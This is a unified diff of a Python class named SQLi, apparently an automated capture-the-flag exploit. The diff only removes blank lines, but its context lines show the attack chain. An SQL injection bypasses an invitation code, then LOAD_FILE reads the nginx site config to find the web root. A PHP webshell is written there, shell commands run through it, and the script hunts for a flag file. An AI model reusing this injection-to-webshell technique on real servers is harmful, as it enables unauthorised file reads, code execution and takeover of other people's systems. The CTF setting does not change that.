@@ -236,7 +236,6 @@ class SQLi:
         time.sleep(0.6)
         spinner.stop("Invitation code bypassed")
         UI.payload(sqli)
-
         spinner = Spinner("Establishing authenticated session...")
         spinner.start()
         self.client.post("/api/login.php", {"username": self.user, "password": pw})
@@ -268,7 +267,6 @@ class SQLi:
         if result:
             UI.substep("Hash algorithm: Argon2i (memory-hard)")
         return result
-
     def get_root(self) -> Optional[str]:
         result = self.inject(
             "LOAD_FILE('/etc/nginx/sites-enabled/default')",
@@ -280,7 +278,6 @@ class SQLi:
                 UI.substep("Parsed root directive from nginx config")
                 return m.group(1).strip()
         return None
-
     def deploy_shell(self, root: str) -> bool:
         path = f"{root}/shell.php"
         spinner = Spinner(f"Writing webshell to {path}...")
@@ -304,9 +301,7 @@ class SQLi:
         time.sleep(0.6)
         files = self.exec("ls /").split()
         spinner.stop("Directory listing complete")
-
         flag_file = next((f for f in files if f.startswith("flag_") and f.endswith(".txt")), None)
-
         if flag_file:
             UI.substep(f"Target identified: /{flag_file}")
 
